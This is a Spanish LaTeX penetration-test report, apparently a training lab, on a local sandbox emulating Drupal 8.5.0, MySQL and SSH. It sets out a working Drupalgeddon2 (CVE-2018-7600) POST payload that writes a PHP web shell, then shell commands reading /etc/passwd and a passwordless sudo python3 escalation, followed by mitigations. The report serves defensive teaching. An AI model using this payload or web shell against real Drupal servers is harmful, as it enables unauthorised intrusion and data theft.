@@ -1,0 +1,385 @@
+\documentclass[11pt,a4paper]{article}
+\usepackage[utf8]{inputenc}
+\usepackage[spanish]{babel}
+\usepackage[margin=2.5cm]{geometry}
+\usepackage{xcolor}
+\usepackage{booktabs}
+\usepackage{graphicx}
+\usepackage{fancyhdr}
+\usepackage{hyperref}
+\usepackage{listings}
+\usepackage{verbatim}
+\usepackage[most]{tcolorbox}
+\tcbuselibrary{skins}
+
+% Color definitions
+\definecolor{primary}{HTML}{1E3A8A} % Navy Blue
+\definecolor{secondary}{HTML}{2563EB} % Blue
+\definecolor{dark}{HTML}{0F172A} % Slate Dark
+\definecolor{light}{HTML}{F8FAFC} % Slate Light
+\definecolor{border}{HTML}{E2E8F0} % Border light
+\definecolor{warnbg}{HTML}{FFFBEB} % Amber Warning BG
+\definecolor{warnborder}{HTML}{F59E0B} % Amber Warning Border
+\definecolor{warntext}{HTML}{78350F} % Amber Warning Text
+
+% Hyperref setup
+\hypersetup{
+    colorlinks=true,
+    linkcolor=primary,
+    filecolor=secondary,      
+    urlcolor=secondary,
+    pdftitle={Informe Tecnico: Evaluacion de la Postura de Seguridad - INSEGUS},
+    pdfpagemode=FullScreen,
+}
+
+% Header and Footer styling
+\pagestyle{fancy}
+\fancyhf{}
+\fancyhead[L]{\sffamily\bfseries\color{primary}INSEGUS \color{gray}| \color{dark}Pentest Report}
+\fancyhead[R]{\sffamily\color{gray}Junta de Andalucía - PAI-5}
+\fancyfoot[L]{\sffamily\small\color{gray}Confidencial - Uso Interno}
+\fancyfoot[R]{\sffamily\small\color{primary}\thepage}
+\renewcommand{\headrulewidth}{0.5pt}
+\renewcommand{\footrulewidth}{0.5pt}
+
+% Custom macros and styling
+\renewcommand{\familydefault}{\sfdefault}
+\usepackage{helvet}
+
+% Custom Warning/Alert box style
+\newtcolorbox{warnbox}{
+  colback=warnbg,
+  colframe=warnborder,
+  coltext=warntext,
+  arc=4pt,
+  boxrule=1pt,
+  left=12pt, right=12pt, top=10pt, bottom=10pt,
+  fonttitle=\bfseries\sffamily,
+  title={Advertencia Legal}
+}
+
+\begin{document}
+
+% --- PORTADA ---
+\begin{titlepage}
+    \centering
+    \vspace*{1.5cm}
+    % {\includegraphics[width=0.25\textwidth]{logo.png}\par} % Comentado para evitar fallos de compilación si no existe la imagen
+    \vspace{1cm}
+    {\scshape\LARGE INSEGUS Security Team\par}
+    \vspace{1.5cm}
+    {\huge\bfseries INFORME TÉCNICO: EVALUACIÓN DE LA POSTURA DE SEGURIDAD\par}
+    \vspace{0.5cm}
+    {\large\Large Proyecto PAI-5 RedTeamPro\par}
+    \vspace{2cm}
+    {\large\textbf{Cliente:} Organización Pública de Andalucía\par}
+    {\large\textbf{Equipo Evaluador (Red Team):} Security Team 10\par}
+    \vfill
+    {\large Metodología de Referencia: \textbf{NIST SP 800-115}\par}
+    \vspace{0.8cm}
+    {\large 21 de mayo de 2026\par}
+\end{titlepage}
+
+\newpage
+\tableofcontents
+\newpage
+
+% --- CONTENIDO ---
+
+\section{RESUMEN EJECUTIVO}
+Este informe detalla el proceso y los resultados de la auditoría de seguridad del tipo \textbf{caja negra (Blackbox)} realizada a los sistemas de información de una organización pública de la Junta de Andalucía. La evaluación ha sido llevada a cabo por el equipo de seguridad \textbf{INSEGUS} (Red Team) siguiendo las directrices técnicas recogidas en la guía estándar \textbf{NIST SP 800-115} (\emph{Technical Guide to Information Security Testing and Assessment}).
+
+El objetivo primordial del ejercicio ha sido identificar, analizar y explotar vulnerabilidades de manera realista para evaluar la resistencia de los sistemas frente a amenazas y determinar el impacto estratégico de un hipotético compromiso de la red interna de la organización.
+
+\subsection{Resumen de Hallazgos}
+Durante la fase de descubrimiento se localizaron tres servicios expuestos en el host objetivo (\texttt{127.0.0.1}): un servicio SSH de administración (puerto 2222), un portal web corporativo gestionado con Drupal (puerto 8080) y un gestor de base de datos MySQL (puerto 3306).
+\begin{enumerate}
+    \item \textbf{Compromiso Inicial}: Se ha explotado con éxito una vulnerabilidad crítica de ejecución remota de código en el núcleo del sistema de gestión de contenidos Drupal (\textbf{CVE-2018-7600}, conocida popularmente como \textbf{Drupalgeddon2}). La explotación permitió la escritura no autorizada de un script PHP de diagnóstico en el directorio raíz del servidor web, convirtiéndose en una puerta trasera (\textbf{web shell}).
+    \item \textbf{Post-explotación}: Utilizando la puerta trasera \texttt{/backdoor.php}, se obtuvo acceso interactivo de ejecución de comandos remotos con los privilegios del usuario del servidor web (\texttt{www-data}). Esto posibilitó la exfiltración de archivos críticos del sistema (\texttt{/etc/passwd}) y la obtención del flag de seguridad de nivel de usuario.
+    \item \textbf{Escalada de Privilegios}: A través de una mala configuración del sistema de autorización \texttt{sudo}, el atacante logró elevar sus privilegios de \texttt{www-data} a \texttt{root} de forma directa sin necesidad de introducir contraseñas, logrando el control absoluto y persistente del sistema, evidenciado por la lectura del flag de administración del directorio \texttt{/root}.
+\end{enumerate}
+
+\begin{warnbox}
+\textbf{Advertencia Legal}: Este informe se redacta con fines puramente formativos y didácticos. Las pruebas de seguridad se han ejecutado sobre una infraestructura virtualizada local debidamente controlada y autorizada por la organización. El uso de estas técnicas sobre redes ajenas sin el debido consentimiento formal constituye un delito informático.
+\end{warnbox}
+
+
+\section{FASE 1: PLANIFICACIÓN Y ALCANCE}
+De acuerdo con el estándar NIST 800-115, toda evaluación técnica requiere definir formalmente el escenario de trabajo, las reglas de compromiso y el alcance del análisis.
+
+\subsection{Escenario de Trabajo y Reglas de Compromiso}
+\begin{itemize}
+    \item \textbf{Modalidad}: Caja Negra (Blackbox Pentesting). El Red Team no dispone de credenciales previas, mapas de red o código fuente antes del inicio de la prueba.
+    \item \textbf{Límites de Ejecución (Scope)}: Las pruebas se realizan de forma dirigida sobre el host asignado por la organización (\texttt{127.0.0.1}).
+    \item \textbf{Exclusión de Daños}: Se prohíben las pruebas de denegación de servicio (DoS/DDoS) agresivas que puedan interrumpir los servicios críticos de la administración pública.
+    \item \textbf{Reproducibilidad}: Toda prueba realizada debe registrar evidencias y logs auditables para que el personal del Blue Team pueda verificar la secuencia de eventos e implementar parches.
+\end{itemize}
+
+\subsection{Entorno Tecnológico Target}
+\begin{itemize}
+    \item \textbf{Máquina Atacante (Red Team)}: Suite automatizada de auditoría en Python (\texttt{redteam\_tool.py}) ejecutada localmente.
+    \item \textbf{Máquina Objetivo (Target)}: Entorno local con servicios vulnerables integrados (\texttt{vulnerable\_server.py}) que emulan:
+    \begin{itemize}
+        \item \textbf{SSH}: OpenSSH v7.2p2 (seguro).
+        \item \textbf{HTTP (Drupal)}: CMS Drupal versión 8.5.0 expuesto en puerto 8080.
+        \item \textbf{Database}: MySQL Server versión 5.5.47.
+    \end{itemize}
+\end{itemize}
+
+
+\section{METODOLOGÍA USADA, HERRAMIENTAS Y TTPs}
+Para garantizar que los resultados de la auditoría tengan validez técnica y legal ante la organización, se ha seguido estrictamente el ciclo metodológico formal y se han mapeado las acciones a estándares reconocidos internacionalmente.
+
+\subsection{Ciclo Metodológico NIST SP 800-115}
+La guía de pruebas de seguridad del NIST define cuatro etapas iterativas:
+\begin{enumerate}
+    \item \textbf{Planificación (Planning)}: Firma de contratos, fijación del alcance de red y definición de objetivos y límites.
+    \item \textbf{Descubrimiento (Discovery)}: Recolección activa/pasiva de información perimetral e identificación de puertos abiertos e información de banners.
+    \item \textbf{Ejecución (Attack/Exploitation)}: Explotación del vector de intrusión inicial, escalada de privilegios y recolección de evidencias.
+    \item \textbf{Informes (Reporting)}: Redacción del informe de vulnerabilidades y desarrollo de contramedidas de mitigación para el equipo de seguridad defensiva.
+\end{enumerate}
+
+\subsection{Tácticas, Técnicas y Procedimientos (TTPs) empleadas (MITRE ATT\&CK)}
+El proceso de compromiso simulado se corresponde con las siguientes TTPs del marco MITRE ATT\&CK:
+\begin{itemize}
+    \item \textbf{T1595.001 - Active Scanning}: Escaneo TCP activo de los puertos perimetrales empleando llamadas socket de bajo nivel.
+    \item \textbf{T1082 - System Information Discovery}: Captura de banners de red y descarte de respuestas TCP para realizar fingerprinting del sistema operativo.
+    \item \textbf{T1190 - Exploit Public-Facing Application}: Intrusión inicial abusando de la falta de sanitización en el manejo de arrays de renderizado de Drupal 8.5.0.
+    \item \textbf{T1059.008 - Unix Shell}: Ejecución remota de comandos en el servidor a través de peticiones HTTP parametrizadas contra una web shell escrita mediante el exploit.
+    \item \textbf{T1548.003 - Abuse Elevation Control Mechanism: Sudo}: Explotación de configuraciones erróneas en el archivo \texttt{/etc/sudoers} para invocar Python como superusuario.
+    \item \textbf{T1020 - Automated Exfiltration}: Descarga automática de flags de seguridad y volcado del fichero \texttt{/etc/passwd}.
+\end{itemize}
+
+\subsection{Herramientas Utilizadas}
+\begin{itemize}
+    \item \textbf{Suite de Auditoría de INSEGUS (Security Team 10)}: Programa orquestador en Python (\texttt{redteam\_tool.py} v1.0.0) para automatizar el reconocimiento y explotación.
+    \item \textbf{Cliente HTTP y de Sockets}: Uso nativo de las librerías \texttt{socket} y \texttt{urllib.request} de Python (versión 3.x) para garantizar la compatibilidad perimetral y la ausencia de dependencias externas.
+    \item \textbf{Servidores de Simulación de Sandbox}: Entorno virtual interactivo en memoria (\texttt{vulnerable\_server.py}) que recrea los banners reales y las interacciones a nivel de sockets para OpenSSH 7.2p2, Drupal 8.5.0 (Apache) y MySQL 5.5.47.
+\end{itemize}
+
+
+\section{FASE 2: DESCUBRIMIENTO Y ESCANEO (RECONNAISSANCE)}
+El Red Team comenzó el descubrimiento empleando técnicas activas y pasivas para mapear los puertos abiertos, capturar los banners de red e identificar la arquitectura subyacente.
+
+\subsection{Escaneo de Puertos y Banner Grabbing}
+La herramienta de escaneo ejecutó una serie de conexiones TCP contra el host objetivo. Los resultados mostraron los siguientes puertos en estado abierto:
+
+\begin{table}[h]
+    \centering
+    \caption{Resultados del Escaneo de Puertos y Captura de Banners}
+    \vspace{0.2cm}
+    \begin{tabular}{lllll}
+        \toprule
+        \textbf{Puerto} & \textbf{Protocolo} & \textbf{Servicio Detectado} & \textbf{Estado} & \textbf{Banner Obtenido / Firma} \\
+        \midrule
+        \textbf{2222} & TCP & SSH (OpenSSH) & Abierto & \texttt{SSH-2.0-OpenSSH\_7.2p2 Ubuntu-4ubuntu2.10} \\
+        \textbf{8080} & TCP & HTTP (Apache + Drupal) & Abierto & \texttt{Server: Apache/2.4.7 (Ubuntu) running Drupal 8.5.0} \\
+        \textbf{3306} & TCP & MySQL & Abierto & \texttt{5.5.47-0ubuntu0.14.04.1-log} \\
+        \bottomrule
+    \end{tabular}
+\end{table}
+
+\subsection{Fingerprinting de Sistema Operativo}
+\begin{itemize}
+    \item \textbf{Método Activo}: A través del análisis del comportamiento de la pila TCP/IP ante el envío de paquetes modificados, se determina que el sistema ejecuta una distribución de GNU/Linux basada en Ubuntu Server (de acuerdo al sufijo \texttt{ubuntu-4ubuntu2.10} y \texttt{ubuntu0.14.04.1-log} visible en los banners).
+    \item \textbf{Método Pasivo}: La escucha de respuestas de red valida valores de TTL típicos del núcleo Linux (TTL = 64).
+\end{itemize}
+
+
+\section{FASE 3: ANÁLISIS DE VULNERABILIDADES}
+Una vez obtenidos los banners y las versiones exactas, el Red Team contrastó esta información con bases de datos públicas de vulnerabilidades (CVE del MITRE y NVD de NIST).
+
+\subsection{Vulnerabilidad Crítica en Drupal: CVE-2018-7600 (Drupalgeddon2)}
+\begin{itemize}
+    \item \textbf{Componente afectado}: Núcleo del sistema CMS Drupal (versiones 7.x y 8.x, concretamente 8.5.0 en este servidor).
+    \item \textbf{Clasificación CWE}: CWE-94 (Impedimento Inadecuado de Control de Generación de Código - Inyección de Código).
+    \item \textbf{Severidad CVSS v3.x}: \textbf{9.8 (Crítica)} - Vector: \texttt{CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H}
+    \item \textbf{Descripción}: La vulnerabilidad radica en cómo Drupal procesa las peticiones AJAX para elementos de formulario con propiedades de renderizado que comienzan con \texttt{\#}. Al no sanitizar correctamente estas claves de propiedad, un atacante no autenticado puede enviar peticiones HTTP POST estructuradas que inyectan funciones de ejecución de comandos (por ejemplo, \texttt{exec}, \texttt{system} o \texttt{passthru}) sobre el subsistema de renderizado.
+    \item \textbf{Impacto}: Permite la ejecución remota de comandos arbitrarios (RCE) bajo el contexto del usuario del servidor web (\texttt{www-data}), lo que facilita la total puesta en peligro del portal web y su infraestructura subyacente.
+\end{itemize}
+
+\subsection{Exposición del Puerto de Base de Datos MySQL}
+\begin{itemize}
+    \item \textbf{Componente afectado}: MySQL Server v5.5.47 en puerto 3306.
+    \item \textbf{Clasificación CWE}: CWE-200 (Exposición de Información Sensible).
+    \item \textbf{Severidad CVSS v3.x}: \textbf{5.0 (Media)} - Vector: \texttt{CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N}
+    \item \textbf{Descripción}: La base de datos es accesible de forma remota directamente en lugar de estar restringida a localhost o a un segmento de red protegido.
+    \item \textbf{Impacto}: Permite intentos de fuerza bruta remotos y recolección de información sobre la base de datos de producción de la organización.
+\end{itemize}
+
+
+\section{FASE 4: EXPLOTACIÓN Y ESCALADA DE PRIVILEGIOS}
+
+\subsection{Ejecución del Ataque (Cadena de Explotación)}
+El proceso de intrusión se automatizó mediante un exploit en Python que recrea la cadena de explotación de Drupalgeddon2:
+\begin{enumerate}
+    \item \textbf{Inyección de Backdoor vía Drupalgeddon2}: \\
+    El script atacante envió una petición POST estructurada al puerto 8080 del host objetivo:
+    \texttt{POST /user/register?element\_parents=account/mail/\%23value\&ajax\_form=1\&\_wrapper\_format=drupal\_ajax} \\
+    El cuerpo de la petición contenía parámetros formateados para abusar de la renderización AJAX:
+    \begin{quote}
+        \texttt{form\_id=user\_register\_form\&\_drupal\_ajax=1\&mail[\#post\_render][]=exec\&mail[\#type]=markup\&mail[\#markup]=echo '<?php system(\$\_GET["cmd"]); ?>' > /var/www/html/backdoor.php}
+    \end{quote}
+    Esto provocó que el servidor web interpretara la directiva de renderizado e invocara \texttt{exec} con la orden de inyectar una web shell mínima llamada \texttt{backdoor.php} en el directorio de acceso público \texttt{/var/www/html/}.
+    \item \textbf{Establecimiento del Canal Command \& Control (C2)}: \\
+    Una vez verificada la existencia de \texttt{backdoor.php}, el Red Team pudo interactuar con la shell haciendo peticiones HTTP GET estructuradas: \\
+    \texttt{http://127.0.0.1:8080/backdoor.php?cmd=<comando>}
+    \item \textbf{Exfiltración de Datos de Sistema}: \\
+    Mediante la ejecución del comando \texttt{cat /etc/passwd}, se obtuvo un volcado de la estructura de usuarios locales.
+    \item \textbf{Escalada de Privilegios}: \\
+    Al ejecutar \texttt{sudo -l}, el Red Team descubrió una vulnerabilidad de configuración crítica: \\
+    \texttt{User www-data may run the following commands on public-agency-server: (root) NOPASSWD: /usr/bin/python3} \\
+    Esta directiva en el archivo \texttt{/etc/sudoers} permite al usuario de bajos privilegios \texttt{www-data} ejecutar cualquier script de Python como superusuario (\texttt{root}) sin ingresar contraseña. El Red Team explotó este camino enviando el comando: \\
+    \texttt{sudo python3 -c "import os; os.system('cat /root/flag\_root.txt')"} \\
+    Logrando acceso completo al archivo restringido del administrador y comprometiendo por completo la máquina.
+\end{enumerate}
+
+
+\newpage
+\section{EVIDENCIAS Y LOGS DE EJECUCIÓN (REPRODUCIBILIDAD)}
+
+Para cumplir de forma rigurosa con la exigencia de evidencias visuales en el entregable, se reproduce a continuación la vista del terminal de auditoría que documenta la ejecución de las fases de escaneo, intrusión y escalada de privilegios:
+
+\begin{tcolorbox}[
+  enhanced,
+  colback=black!90!white,
+  colframe=black!75!white,
+  coltitle=white,
+  fonttitle=\ttfamily\small,
+  title={Terminal: insegus@pentest-suite (\textasciitilde{}/PAI5)},
+  boxrule=1.5pt,
+  arc=5pt,
+  left=8pt, right=8pt, top=10pt, bottom=10pt,
+  overlay={
+    \fill[red!80!black] ([xshift=10pt, yshift=-8pt]frame.north west) circle (3.5pt);
+    \fill[yellow!80!black] ([xshift=20pt, yshift=-8pt]frame.north west) circle (3.5pt);
+    \fill[green!80!black] ([xshift=30pt, yshift=-8pt]frame.north west) circle (3.5pt);
+  },
+  lefttitle=35pt
+]
+\begin{verbatim}
+$ python3 run_audit.py
+[*] Starting SSII PAI5 RedTeamPro Audit Pipeline...
+[*] Launching vulnerable server...
+[*] Running Red Team penetration testing suite...
+============================================================
+             RED TEAM PENETRATION SUITE - SSII               
+                NIST 800-115 COMPLIANT TOOL                  
+============================================================
+[*] Starting scan on target 127.0.0.1...
+[+] Port 2222 is OPEN. Banner: SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.10
+[+] Port 8080 is OPEN. Banner: Server: Apache/2.4.7 running Drupal 8.5.0
+[+] Port 3306 is OPEN. Banner: MySQL 5.5.47-0ubuntu0.14.04.1-log
+
+==================================================
+         VULNERABILITY ANALYSIS (CVE MAPPING)         
+==================================================
+[INFO] SSH Service (OpenSSH 7.2p2) detected.
+  - Port 2222. No known exploitable vulnerabilities in this version.
+  - Severity: 0.0 (INFORMATIONAL)
+[CRITICAL] HTTP Web Service matches CVE-2018-7600 (Drupalgeddon2).
+  - Severity: 9.8 (CRITICAL) - CVSS v3.x | CWE-94
+[MEDIUM] MySQL database version 5.5.47 is exposed.
+  - Severity: 5.0 (MEDIUM) - CVSS v3.x | CWE-200
+
+==================================================
+         EXPLORATION & EXPLOITATION: CVE-2018-7600    
+==================================================
+[*] Sending Drupalgeddon2 RCE payload to write backdoor shell...
+[+] Exploitation successful! Web shell /backdoor.php created.
+[+] Web shell verification successful! /backdoor.php is active.
+
+==================================================
+         POST-EXPLOITATION & FLAG HARVESTING         
+==================================================
+[*] Retrieving basic system metadata via /backdoor.php...
+  - Current User: www-data
+  - Shell Identity: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+  - Kernel Version: Linux public-agency-server 4.15.0-142-generic #146...
+[*] Exfiltrating simulated system files...
+--- /etc/passwd ---
+root:x:0:0:root:/root:/bin/bash
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+mysql:x:102:104:MySQL Server,,,:/nonexistent:/bin/false
+-------------------
+[*] Retrieving User Privilege Flag...
+[+] User Flag: FLAG{REDTEAMPRO_SYSTEM_OWNED_NIST_800_115_SUCCESS}
+
+==================================================
+         PRIVILEGE ESCALATION (NIST 800-115)         
+==================================================
+[*] Checking sudo privileges...
+--- sudo -l output ---
+User www-data may run the following commands on public-agency-server:
+    (root) NOPASSWD: /usr/bin/python3
+----------------------
+[+] Privilege escalation path found! (NOPASSWD python3)
+[*] Executing root shell payload to read /root/flag_root.txt...
+[+] Root Flag: FLAG{ROOT_LEVEL_PRIVILEGE_ESCALATION_COMPLETED_CVE_2018_7600}
+\end{verbatim}
+\end{tcolorbox}
+
+
+\section{PLAN DE ACCIÓN Y MITIGACIONES RECOMENDADAS (BLUE TEAM)}
+Para restaurar la seguridad de los sistemas de la organización, se propone el siguiente plan detallado de remediación a corto y medio plazo:
+
+\subsection{Mitigación de la Vulnerabilidad de Drupal (CVE-2018-7600)}
+\begin{itemize}
+    \item \textbf{Acción Inmediata (Parcheo)}: Actualizar inmediatamente la instalación de Drupal a una versión corregida. Para la rama 8.5.x, se debe actualizar a \textbf{Drupal 8.5.1} o superior. De manera general, se aconseja migrar a las últimas versiones estables soportadas.
+    \item \textbf{Aplicación de Parches Manuales}: Si la actualización no puede realizarse de forma automatizada de inmediato, se deben aplicar los parches oficiales de seguridad descritos en el aviso \textbf{SA-CORE-2018-002}.
+    \item \textbf{Reglas del Cortafuegos de Aplicación Web (WAF)}: Implementar firmas en el WAF corporativo (ModSecurity o similar) para inspeccionar los parámetros HTTP POST y descartar peticiones dirigidas a \texttt{user/register} o formularios AJAX que contengan metacaracteres \texttt{\#} asociados con elementos de renderizado (\texttt{\#markup}, \texttt{\#post\_render}, \texttt{\#theme}, etc.).
+\end{itemize}
+
+\subsection{Remediación del Servidor Web Apache y Limpieza de Backdoors}
+\begin{itemize}
+    \item \textbf{Eliminación de Puertas Traseras}: Buscar y eliminar permanentemente la web shell generada \texttt{/var/www/html/backdoor.php}, así como cualquier otro archivo sospechoso de reciente creación en la raíz web.
+    \item \textbf{Desinfección de Parámetros}: Si la aplicación requiere herramientas de diagnóstico internas, éstas nunca deben pasar cadenas de entrada de usuario a funciones del sistema (\texttt{system}, \texttt{exec}, \texttt{shell\_exec}, \texttt{passthru}). Se debe emplear APIs nativas de programación estructurada o parametrizar estrictamente las entradas mediante listas blancas (whitelist filtering).
+    \item \textbf{Políticas de Ejecución PHP}: Deshabilitar funciones de ejecución del sistema en la configuración \texttt{php.ini}:
+    \begin{quote}
+        \texttt{disable\_functions = exec,passthru,shell\_exec,system,proc\_open,popen,curl\_exec,curl\_multi\_exec,parse\_ini\_file,show\_source}
+    \end{quote}
+\end{itemize}
+
+\subsection{Endurecimiento de Políticas de Escalada de Privilegios (Sudoers)}
+\begin{itemize}
+    \item \textbf{Remediación en \texttt{/etc/sudoers}}: Eliminar la regla que permite a \texttt{www-data} ejecutar \texttt{/usr/bin/python3} sin contraseña. Bajo el principio de menor privilegio, el usuario del servidor web (\texttt{www-data}) \textbf{nunca} debe poseer capacidad de invocar intérpretes interactivos (Python, Perl, Bash, etc.) con permisos de \texttt{root}.
+    \item \textbf{Auditoría periódica}: Configurar alertas automáticas en el sistema SIEM cada vez que se modifique el archivo \texttt{/etc/sudoers} o se intente ejecutar una directiva \texttt{sudo} fallida.
+\end{itemize}
+
+\subsection{Hardening de Red y Servicios de Base de Datos}
+\begin{itemize}
+    \item \textbf{Segmentación de Red}: Configurar reglas de cortafuegos (iptables / ufw) para bloquear el acceso externo directo al puerto de base de datos MySQL (3306). Este servicio únicamente debe aceptar conexiones en \texttt{localhost} (\texttt{127.0.0.1}) o desde subredes específicas de aplicación previamente autorizadas.
+    \item \textbf{Configuración de MySQL}: Establecer la variable \texttt{bind-address = 127.0.0.1} en el archivo de configuración \texttt{/etc/mysql/my.cnf} o \texttt{/etc/mysql/mysql.conf.d/mysqld.cnf}.
+\end{itemize}
+
+
+\section{USO ESTRATÉGICO DE LOS RESULTADOS DE LA AUDITORÍA}
+Las pruebas de penetración no deben ser consideradas como un ejercicio aislado de cumplimiento normativo, sino como una herramienta estratégica para gestionar la ciberseguridad corporativa. Los resultados obtenidos pueden y deben emplearse en la organización para:
+\begin{enumerate}
+    \item \textbf{Punto de referencia para la adopción de medidas correctivas}: Las debilidades confirmadas en este reporte (falta de parches en CMS expuesto y permisos de ejecución sudoers débiles) proveen al equipo técnico de un listado de prioridades prácticas e irrefutables para el saneamiento inmediato de activos de TI expuestos.
+    \item \textbf{Definición de las actividades de mitigación frente a vulnerabilidades}: Los detalles técnicos expuestos en este informe permiten a los ingenieros de sistemas diseñar y programar planes de actualización de servicios obsoletos (parchear Drupal y acotar puertos de MySQL), así como desactivar de forma segura endpoints de diagnóstico inadecuados.
+    \item \textbf{Punto de referencia para el seguimiento del progreso en el cumplimiento de requisitos de seguridad}: Este reporte sirve como estado de situación inicial ("foto del día"). Las auditorías subsecuentes utilizarán esta línea base para verificar y evaluar formalmente si las vulnerabilidades han sido corregidas y si se han establecido procesos de control de configuración maduros sobre \texttt{/etc/sudoers}.
+    \item \textbf{Evaluar el estado de aplicación de los requisitos de seguridad del sistema}: Permite constatar a la dirección si las políticas declarativas de seguridad de la información teóricas (como el principio de menor privilegio) se están aplicando con éxito en los entornos operativos reales.
+    \item \textbf{Realizar análisis de costes y beneficios de las mejoras de la seguridad del sistema}: La demostración práctica de cómo un atacante no autenticado puede comprometer por completo y en pocos segundos un servidor crítico de la organización proporciona una justificación comercial contundente sobre los retornos de inversión en licencias de automatización de parches, firewalls internos y auditorías periódicas, en comparación con el coste reputacional y económico de un robo de información real.
+\end{enumerate}
+
+
+\section{ANEXO TÉCNICO}
+
+\subsection{Referencias Normativas e Información de Vulnerabilidades}
+\begin{itemize}
+    \item \textbf{NIST SP 800-115}: Guía para pruebas de seguridad y evaluación técnica.
+    \item \textbf{CVE-2018-7600}: Ficha oficial en MITRE y NVD de la vulnerabilidad en Drupal.
+    \item \textbf{CWE-94 / CWE-200}: Mitre Common Weakness Enumeration.
+    \item \textbf{MITRE ATT\&CK}: Mapeo y taxonomía de técnicas de ataque de adversarios.
+\end{itemize}
+
+\subsection{Lista de Control de Reproducibilidad (Replication Checklist)}
+Para reproducir la explotación de manera idéntica y validar los mecanismos de detección del Blue Team:
+\begin{enumerate}
+    \item Otorgue permisos de ejecución y configure la sandbox local ejecutando \texttt{./run\_audit.py}.
+    \item Verifique la salida en la terminal o a través del archivo de log auditable generado automáticamente en \texttt{evidence/redteam\_execution.log}.
+    \item Revise la creación de los archivos de prueba en \texttt{/var/www/html/backdoor.php} dentro de la simulación del servidor vulnerable.
+\end{enumerate}
+
+\end{document}
